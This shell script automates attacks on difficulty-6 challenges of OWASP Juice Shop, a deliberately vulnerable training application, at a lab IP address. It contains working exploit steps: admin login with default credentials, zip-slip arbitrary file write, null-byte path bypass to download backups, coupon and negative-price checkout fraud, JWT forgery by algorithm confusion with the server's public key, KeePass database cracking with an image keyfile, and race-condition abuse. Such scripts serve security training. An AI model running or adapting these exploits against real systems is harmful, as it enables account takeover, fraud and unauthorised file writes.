#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.87.170"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null


# Initiate session and cookies
echo "6.0 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L -o /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/6-cookies.txt" -L -o /dev/null
IO=$(grep io "$result_folder/6-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
sed -i 's/#HttpOnly_//g' "$result_folder/6-cookies.txt"
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> $result_folder/6-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> $result_folder/6-cookies.txt

# Overwrite the Legal Information file
echo "6.1 - ARBITRARY FILE WRITE"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/6-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" -o $result_folder/6-admin.json
ADMIN_TOKEN=$(jq -r '.authentication.token' $result_folder/6-admin.json)
BASKET_ID=$(jq -r '.authentication.bid' $result_folder/6-admin.json)
echo "--> Authenticated as admin with token $(echo "$ADMIN_TOKEN" | cut -c 1-20)...."
cp $result_folder/6-cookies.txt $result_folder/6-admin-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$ADMIN_TOKEN" >> $result_folder/6-admin-cookies.txt
mkdir /tmp/ftp 2> /dev/null && mkdir /tmp/tmp 2> /dev/null && mkdir /tmp/tmp/tmp 2> /dev/null
cd /tmp/tmp/tmp
echo "mwahaha" > ../../ftp/legal.md
rm $result_folder/legal.md.zip 2> /dev/null
zip -q $result_folder/legal.md.zip ../../ftp/legal.md
cd - > /dev/null
curl -s -X POST "http://$target_ip/file-upload" -b "$result_folder/6-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -F "file=@$result_folder/legal.md.zip;type=application/zip" -o /dev/null

# Forge a coupon code that gives you a discount of at least 80%.
echo "6.2 - FORGED COUPONS"
curl -s -X GET "http://$target_ip/ftp/coupons_2013.md.bak%2500.md" -b "$result_folder/6-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/6-coupons_2013.md.bak
npm install -g z85-cli 2> /dev/null
COUPON=$(z85 -e DEC24-90 | sed 's/ //g')
echo "--> Coupon is : $COUPON"
COUPON_URL=$(echo $COUPON | sed 's/ /%20/g; s/!/%21/g; s/"/%22/g; s/#/%23/g; s/\$/%24/g; s/%/%25/g; s/&/%26/g; s/'"'"'/%27/g; s/(/%28/g; s/)/%29/g; s/\*/%2A/g; s/+/%2B/g; s/,/%2C/g; s/-/%2D/g; s/\./%2E/g; s/\//%2F/g; s/:/%3A/g; s/;/%3B/g; s/</%3C/g; s/=/%3D/g; s/>/%3E/g; s/\?/%3F/g; s/@/%40/g; s/\[/%5B/g; s/\\/%5C/g; s/\]/%5D/g; s/\^/%5E/g; s/_/%5F/g; s/`/%60/g; s/{/%7B/g; s/|/%7C/g; s/}/%7D/g; s/~/%7E/g')
echo "--> Encoded coupon is : $COUPON_URL"
BASKET_ID=$(jq -r '.authentication.bid' $result_folder/6-admin.json)
curl -s -X PUT "http://$target_ip/api/Products/1" -b "$result_folder/6-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -d "{\"price\":-10000}" -o /dev/null
curl -s -X POST "http://$target_ip/api/BasketItems/" -b "$result_folder/6-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -d "{\"ProductId\":1,\"BasketId\":\"$BASKET_ID\",\"quantity\":4}" -o /dev/null
curl -s -X PUT "http://$target_ip/rest/basket/1/coupon/$COUPON_URL" -b "$result_folder/6-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o /dev/null
curl -s -X POST "http://$target_ip/rest/basket/$BASKET_ID/checkout" -b "$result_folder/6-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -d "{\"couponData\":\"bH02RCNnK3lady0xNzM0NDc2NDAwMDAw\",\"orderDetails\":{\"paymentId\":\"wallet\",\"addressId\":\"7\",\"deliveryMethodId\":\"1\"}}" -o /dev/null


# Forge a coupon code that gives you a discount of at least 80%.
# Changing the algorithm into a symmetric one leads to the server using only the public key
echo "6.3 - FORGED SIGNED JWT"
NOW=$(date +%s)
THEN=$(date -d "+1 month" +%s)
TOKEN_HEADER="{\"typ\":\"JWT\",\"alg\":\"HS256\"}"
TOKEN_PAYLOAD="{\"status\":\"success\",\"data\":{\"id\":1,\"username\":\"\",\"email\":\"rsa_lord@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"0.0.0.0\",\"profileImage\":\"assets/public/images/uploads/default.svg\",\"totpSecret\":\"\",\"isActive\":true,\"createdAt\":\"2024-12-17 16:07:51.260 +00:00\",\"updatedAt\":\"2024-12-17 16:07:51.260 +00:00\",\"deletedAt\":null},\"iat\":$NOW,\"exp\":$THEN}"
echo "$TOKEN_HEADER$TOKEN_PAYLOAD" > $result_folder/6-token.json
ENCODED_HEADER=$(echo "$TOKEN_HEADER"  | tr -d '\n' | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
ENCODED_PAYLOAD=$(echo "$TOKEN_PAYLOAD"  | tr -d '\n' | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
UNSIGNED_TOKEN="$ENCODED_HEADER.$ENCODED_PAYLOAD"
echo "--> Unsigned token is : $(echo "$UNSIGNED_TOKEN" | cut -c 1-20)...."
curl -s -X GET "http://$target_ip/encryptionkeys/jwt.pub" -b "$result_folder/6-cookies.txt" -L -o $result_folder/6-jwt.pub
SIGNATURE=$(echo -n "$UNSIGNED_TOKEN" | openssl dgst -sha256 -hmac "$(cat $result_folder/6-jwt.pub)" -binary | openssl base64 -A | tr '+/' '-_' | tr -d '=')
SIGNED_TOKEN="$UNSIGNED_TOKEN.$SIGNATURE"
echo "--> Signed token is : $(echo "$SIGNED_TOKEN" | cut -c 1-20)...."
cp $result_folder/6-cookies.txt $result_folder/6-rsa_lord-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$SIGNED_TOKEN" >> $result_folder/6-rsa_lord-cookies.txt
curl -s -X GET "http://$target_ip/profile" -b "$result_folder/6-rsa_lord-cookies.txt" -L -H "Content-Type: application/json" -H "Authorization: Bearer ${SIGNED_TOKEN}" -o  /dev/null


# Solve challenge #999. Unfortunately, this challenge does not exist.
echo "6.4 - IMAGINARY CHALLENGE"
curl -s -X POST "http://$target_ip/api/Challenges/999" -b "$result_folder/6-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -d "{\"solved\":true}"
curl -s -X GET "http://$target_ip/encryptionkeys/premium.key" -b "$result_folder/6-cookies.txt" -L -o $result_folder/6-premium.key

# Log in with the support team's original user credentials without applying SQL Injection or any other bypass.
echo "6.5 - LOGIN SUPPORT TEAM"
curl -s -X GET "http://$target_ip/ftp/incident-support.kdbx" -b "$result_folder/6-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/6-incident-support.kdbx
curl -s -X GET "http://$target_ip/assets/public/images/carousel/6.jpg" -b "$result_folder/1-admin-cookies.txt" -L -o $result_folder/6-caoimhe.jpg
SUPPORT_PASSWORD=$(keepassxc-cli show --no-password -s -k $result_folder/6-caoimhe.jpg $result_folder/6-incident-support.kdbx prod | sed -n 's/.*Password: \(.*\)/\1/p')
echo "--> Support password is $SUPPORT_PASSWORD"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/6-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"support@juice-sh.op\",\"password\":\"$SUPPORT_PASSWORD\"}" -o $result_folder/6-support.json
SUPPORT_TOKEN=$(jq -r '.authentication.token' $result_folder/6-support.json)
BASKET_ID=$(jq -r '.authentication.bid' $result_folder/6-support.json)
echo "--> Authenticated as support with token $(echo "$SUPPORT_TOKEN" | cut -c 1-20)...."
cp $result_folder/6-cookies.txt $result_folder/6-support-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$SUPPORT_TOKEN" >> $result_folder/6-support-cookies.txt

# Like any review at least three times as the same user.
echo "6.6 - MULTIPLE LIKES"
curl -s -X GET "http://$target_ip/rest/products/24/reviews" -b "$result_folder/6-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/6-reviews.json
REVIEW_ID=$(jq -r '.data[0]._id' $result_folder/6-reviews.json)
echo "--> Review id is $REVIEW_ID"
for i in $(seq 1 5); do
    curl -s -X POST "http://$target_ip/rest/products/reviews" \
    -b "$result_folder/6-admin-cookies.txt" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -L -d "{\"id\":\"$REVIEW_ID\"}" -o /dev/null &
done

# Compute score
echo "6.X - COMPUTE SCORE"
curl -s -X GET http://$target_ip/api/Challenges/?sort=name -b "$result_folder/6-cookies.txt" -L -o $result_folder/6-scores.json
SOLVED=$(jq '[.data[] | select(.difficulty == 6 and .solved == true)] | length' $result_folder/6-scores.json)
TOTAL=$(jq '[.data[] | select(.difficulty == 6 and .solved != null)] | length' $result_folder/6-scores.json)
echo "\n************* SOLVED : $SOLVED / $TOTAL *************\n"